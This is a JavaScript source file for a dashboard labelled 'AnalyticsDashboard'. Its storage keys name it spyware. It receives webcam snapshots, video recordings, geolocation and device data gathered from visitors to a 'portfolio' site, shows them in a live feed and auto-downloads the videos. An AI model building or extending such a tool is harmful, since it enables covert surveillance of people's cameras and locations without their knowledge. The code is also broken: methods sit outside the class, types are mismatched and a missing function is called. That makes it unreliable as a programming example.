class AnalyticsDashboard {
    constructor() {
        this.visitors = new Map();
        this.capturedImages = [];
        this.liveFeed = [];
        this.isLive = true;
        this.stats = {
            totalVisitors: 0,
            activeSessions: 0,
            permissionGranted: 0,
            dataPoints: 0
        };
        
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.startDataReceiver();
        this.updateUI();
        this.setupWebSocket();
    }

    setupEventListeners() {
        document.getElementById('clearData').addEventListener('click', () => this.clearAllData());
        document.getElementById('exportData').addEventListener('click', () => this.exportData());
        document.getElementById('toggleLive').addEventListener('click', () => this.toggleLiveUpdates());
        
        // Modal close
        document.querySelector('.close').addEventListener('click', () => this.closeModal());
        document.getElementById('imageModal').addEventListener('click', (e) => {
            if (e.target.id === 'imageModal') this.closeModal();
        });
    }

    setupWebSocket() {
        // Simulate WebSocket connection for real-time updates
        // In production, this would connect to your actual WebSocket server
        this.simulateDataFeed();
    }

    simulateDataFeed() {
        // Simulate receiving data from portfolio
        setInterval(() => {
            if (this.isLive && Math.random() > 0.7) {
                this.simulateVisitorData();
            }
        }, 5000);
    }

    simulateVisitorData() {
        const visitorId = 'visitor_' + Date.now();
        const fakeData = {
            id: visitorId,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            permissions: {
                camera: Math.random() > 0.5,
                location: Math.random() > 0.5,
                notifications: Math.random() > 0.3
            },
            location: Math.random() > 0.5 ? {
                latitude: (Math.random() * 180 - 90).toFixed(6),
                longitude: (Math.random() * 360 - 180).toFixed(6),
                accuracy: (Math.random() * 100 + 10).toFixed(0)
            } : null,
            deviceInfo: this.getDeviceInfo(),
            sessionId: this.generateSessionId()
        };

        this.processVisitorData(fakeData);
    }

    startDataReceiver() {
        // Listen for messages from portfolio (using postMessage in production)
        window.addEventListener('message', (event) => {
            if (event.data.type === 'ANALYTICS_DATA') {
                this.processVisitorData(event.data.payload);
            }
        });

        // Check for data stored by portfolio
        this.checkPortfolioData();

        // Also try to fetch from localStorage for demo purposes
        this.loadStoredData();

        // Set up periodic check for new portfolio data
        setInterval(() => this.checkPortfolioData(), 5000);
    }

    processVisitorData(data) {
        const visitorId = data.id || data.sessionId;
        
        // Check if visitor already exists
        if (this.visitors.has(visitorId)) {
            // Update existing visitor
            const existingVisitor = this.visitors.get(visitorId);
            this.visitors.set(visitorId, {
                ...existingVisitor,
                ...data,
                lastSeen: new Date().toISOString()
            });
        } else {
            // Add new visitor
            this.visitors.set(visitorId, {
                ...data,
                firstSeen: data.timestamp || new Date().toISOString(),
                lastSeen: new Date().toISOString()
            });
        }

        // Update stats
        this.stats.totalVisitors = this.visitors.size;
        this.stats.activeSessions = this.getActiveSessionCount();
        this.stats.dataPoints += this.countDataPoints(data);
        
        if (data.permissions && Object.values(data.permissions).some(p => p)) {
            this.stats.permissionGranted++;
        }

        // Add to live feed
        this.addToLiveFeed(data);

        // Handle captured images (both old and new format)
        if (data.capturedImage || data.type === 'CAPTURED_IMAGE') {
            const imageData = data.capturedImage || data;
            this.capturedImages.push({
                ...imageData,
                visitorId,
                timestamp: new Date().toISOString()
            });
            console.log('Captured image added to dashboard:', imageData.timestamp);
        }

        // Handle video recordings
        if (data.type === 'VIDEO_RECORDING') {
            this.handleVideoRecording(data);
        }

        // Handle stats documents
        if (data.type === 'STATS_DOCUMENT') {
            this.handleStatsDocument(data);
        }

        this.updateUI();
        this.saveData();
    }

    getActiveSessionCount() {
        const now = new Date();
        let activeCount = 0;
        
        this.visitors.forEach(visitor => {
            const lastSeen = new Date(visitor.lastSeen);
            const diffMinutes = (now - lastSeen) / (1000 * 60);
            if (diffMinutes < 30) activeCount++;
        });
        
        return activeCount;
    }

    countDataPoints(data) {
        let count = 1; // Basic visit
        if (data.permissions) count += Object.keys(data.permissions).length;
        if (data.location) count += 3; // lat, long, accuracy
        if (data.capturedImage) count += 5; // Image data
        return count;
    }

    addToLiveFeed(data) {
        const feedItem = {
            type: 'visit',
            timestamp: new Date().toISOString(),
            visitorId: data.id || data.sessionId,
            message: `New visitor from ${data.deviceInfo?.browser || 'Unknown'}`,
            data: data
        };

        if (data.permissions?.camera) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Camera access granted by ${data.id || data.sessionId}`
            });
        }

        if (data.permissions?.location) {
            this.liveFeed.push({
                ...feedItem,
                type: 'location',
                message: `Location data received from ${data.id || data.sessionId}`
            });
        }

        if (data.capturedImage) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Image captured from ${data.id || data.sessionId}`
            });
        }

        // Keep only last 50 items
        this.liveFeed = this.liveFeed.slice(-50);
    }

    updateUI() {
        // Update stats
        document.getElementById('totalVisitors').textContent = this.stats.totalVisitors;
        document.getElementById('activeSessions').textContent = this.stats.activeSessions;
        document.getElementById('permissionGranted').textContent = this.stats.permissionGranted;
        document.getElementById('dataPoints').textContent = this.stats.dataPoints;

        // Update visitors list
        this.updateVisitorsList();

        // Update live feed
        this.updateLiveFeed();

        // Update captured images
        this.updateCapturedImages();

        // Update device analytics
        this.updateDeviceAnalytics();
    }

    updateVisitorsList() {
        const container = document.getElementById('visitorsList');
        
        if (this.visitors.size === 0) {
            container.innerHTML = '<p class="no-data">No visitor data yet</p>';
            return;
        }

        const visitorsArray = Array.from(this.visitors.values()).slice(-10).reverse();
        container.innerHTML = visitorsArray.map(visitor => `
            <div class="visitor-card">
                <h4>${visitor.id || 'Unknown'}</h4>
                <div class="visitor-info">
                    <div><strong>Device:</strong> ${visitor.deviceInfo?.browser || 'Unknown'}</div>
                    <div><strong>Screen:</strong> ${visitor.screenResolution || 'Unknown'}</div>
                    <div><strong>Location:</strong> ${visitor.location ? (typeof visitor.location.latitude === 'number' && typeof visitor.location.longitude === 'number' ? `${visitor.location.latitude.toFixed(6)}, ${visitor.location.longitude.toFixed(6)} (${visitor.location.accuracyLevel || visitor.location.source || 'browser'})${visitor.location.accuracy ? ` ±${Math.round(visitor.location.accuracy)}m` : ''}` : visitor.location.latitude && visitor.location.longitude ? `${visitor.location.latitude}, ${visitor.location.longitude} (${visitor.location.source || 'browser'})` : 'Not granted') : 'Not granted'}</div>
                    <div><strong>Permissions:</strong> ${this.formatPermissions(visitor.permissions)}</div>
                    <div><strong>Last seen:</strong> ${new Date(visitor.lastSeen).toLocaleTimeString()}</div>
                </div>
            </div>
        `).join('');
    }

    updateLiveFeed() {
        const container = document.getElementById('liveFeed');
        
        if (this.liveFeed.length === 0) {
            container.innerHTML = '<p class="no-data">Waiting for data...</p>';
            return;
        }

        container.innerHTML = this.liveFeed.slice(-20).reverse().map(item => `
            <div class="feed-item ${item.type}">
                <strong>${new Date(item.timestamp).toLocaleTimeString()}</strong><br>
                ${item.message}
            </div>
        `).join('');
    }

    updateCapturedImages() {
        const container = document.getElementById('capturedImages');
        
        if (this.capturedImages.length === 0) {
            container.innerHTML = '<p class="no-data">No images captured yet</p>';
            return;
        }

        container.innerHTML = this.capturedImages.slice(-12).reverse().map((img, index) => `
            <img src="${img.data}" alt="Captured ${index + 1}" class="image-thumbnail" 
                 onclick="dashboard.showImageModal(${this.capturedImages.length - 1 - index})">
        `).join('');
    }

    updateDeviceAnalytics() {
        const deviceStats = {};
        
        this.visitors.forEach(visitor => {
            const browser = visitor.deviceInfo?.browser || 'Unknown';
            deviceStats[browser] = (deviceStats[browser] || 0) + 1;
        });

        const container = document.getElementById('deviceBreakdown');
        container.innerHTML = Object.entries(deviceStats)
            .sort(([,a], [,b]) => b - a)
            .map(([device, count]) => `
                <div style="display: flex; justify-content: space-between; padding: 5px 0;">
                    <span>${device}</span>
                    <span><strong>${count}</strong></span>
                </div>
            `).join('');
    }

    formatPermissions(permissions) {
        if (!permissions) return 'None';
        const granted = Object.entries(permissions)
            .filter(([, granted]) => granted)
            .map(([perm]) => perm);
        return granted.length > 0 ? granted.join(', ') : 'None';
    }

    showImageModal(index) {
        const image = this.capturedImages[index];
        if (!image) return;

        document.getElementById('modalImage').src = image.data;
        document.getElementById('imageTitle').textContent = `Captured from ${image.visitorId}`;
        document.getElementById('imageTimestamp').textContent = `Time: ${new Date(image.timestamp).toLocaleString()}`;
        document.getElementById('imageDeviceInfo').textContent = `Device: ${image.deviceInfo || 'Unknown'}`;
        document.getElementById('imageModal').style.display = 'block';
    }

    closeModal() {
        document.getElementById('imageModal').style.display = 'none';
    }

    toggleLiveUpdates() {
        this.isLive = !this.isLive;
        const btn = document.getElementById('toggleLive');
        btn.textContent = this.isLive ? 'Pause Live Updates' : 'Resume Live Updates';
        btn.className = this.isLive ? 'btn-secondary' : 'btn-primary';
        
        // Update status indicator
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        
        if (this.isLive) {
            statusDot.style.background = '#2ecc71';
            statusText.textContent = 'Connected';
        } else {
            statusDot.style.background = '#f39c12';
            statusText.textContent = 'Paused';
        }
    }

    clearAllData() {
        if (confirm('Are you sure you want to clear all collected data?')) {
            this.visitors.clear();
            this.capturedImages = [];
            this.liveFeed = [];
            this.stats = {
                totalVisitors: 0,
                activeSessions: 0,
                permissionGranted: 0,
                dataPoints: 0
            };
            
            localStorage.removeItem('spyware_dashboard_data');
            this.updateUI();
        }
    }

    exportData() {
        const exportData = {
            stats: this.stats,
            visitors: Array.from(this.visitors.values()),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            exportDate: new Date().toISOString()
        };

        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `analytics_export_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        URL.revokeObjectURL(url);
    }

    saveData() {
        const dataToSave = {
            visitors: Array.from(this.visitors.entries()),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            stats: this.stats
        };
        localStorage.setItem('spyware_dashboard_data', JSON.stringify(dataToSave));
    }

    checkPortfolioData() {
        try {
            const portfolioData = localStorage.getItem('spyware_portfolio_data');
            if (portfolioData) {
                const data = JSON.parse(portfolioData);
                
                // Process new data entries
                data.forEach(entry => {
                    if (entry.data && !this.visitors.has(entry.sessionId)) {
                        this.processVisitorData(entry.data);
                    }
                });

                // Clear processed data to avoid duplicates
                localStorage.removeItem('spyware_portfolio_data');
            }
        } catch (e) {
            console.error('Failed to check portfolio data:', e);
        }
    }

    handleVideoRecording(data) {
        // Store video data for dashboard viewing
        if (!this.videoRecordings) this.videoRecordings = [];
        
        this.videoRecordings.push({
            sessionId: data.sessionId,
            videoData: data.videoData,
            fileName: data.fileName,
            timestamp: data.timestamp,
            duration: data.duration
        });
        
        // Add to live feed
        this.addToLiveFeed({
            type: 'video',
            message: `Video recording completed for ${data.sessionId}`,
            timestamp: new Date().toISOString()
        });
        
        // Auto-download video to dashboard device
        this.downloadVideo(data.videoData, data.fileName);
        
        console.log('Video recording processed:', data.fileName);
    }

    handleStatsDocument(data) {
        // Store document data
        if (!this.statsDocuments) this.statsDocuments = [];
        
        this.statsDocuments.push({
            sessionId: data.sessionId,
            documentContent: data.documentContent,
            fileName: data.fileName,
            timestamp: data.timestamp
        });
        
        // Add to live feed
        this.addToLiveFeed({
            type: 'document',
            message: `Stats document generated for ${data.sessionId}`,
            timestamp: new Date().toISOString()
        });
        
        // Auto-download document to dashboard device
        this.downloadDocument(data.documentContent, data.fileName);
        
        console.log('Stats document processed:', data.fileName);
    }

    downloadVideo(videoData, fileName) {
        // Convert base64 to blob and download
        const byteCharacters = atob(videoData.split(',')[1]);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: 'video/webm' });
        
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => URL.revokeObjectURL(url), 1000);
    }

    downloadDocument(documentContent, fileName) {
        const blob = new Blob([documentContent], { type: 'application/msword' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName;
        
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        setTimeout(() => URL.revokeObjectURL(url), 1000);
    }

    loadStoredData() {
        const stored = localStorage.getItem('spyware_dashboard_data');
        if (stored) {
            try {
                const data = JSON.parse(stored);
                this.visitors = data.visitors || [];
                this.capturedImages = data.capturedImages || [];
                this.videoRecordings = data.videoRecordings || [];
                this.statsDocuments = data.statsDocuments || [];
                this.updateDashboard();
            } catch (e) {
                console.error('Error loading stored data:', e);
            }
        }
        
        // Load separate video files from localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && key.startsWith('spyware_video_')) {
                try {
                    const videoData = JSON.parse(localStorage.getItem(key));
                    this.handleVideoRecording(videoData);
                    console.log('Loaded video from separate storage:', key);
                } catch (error) {
                    console.error('Error loading video data:', error);
                }
            }
        }
    }
}

getDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edge')) browser = 'Edge';
    
    return {
        browser,
        os: navigator.platform,
        mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)
    };
}

generateSessionId() {
    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
}

// Initialize dashboard
const dashboard = new AnalyticsDashboard();

// Expose for cross-window communication
window.dashboard = dashboard;
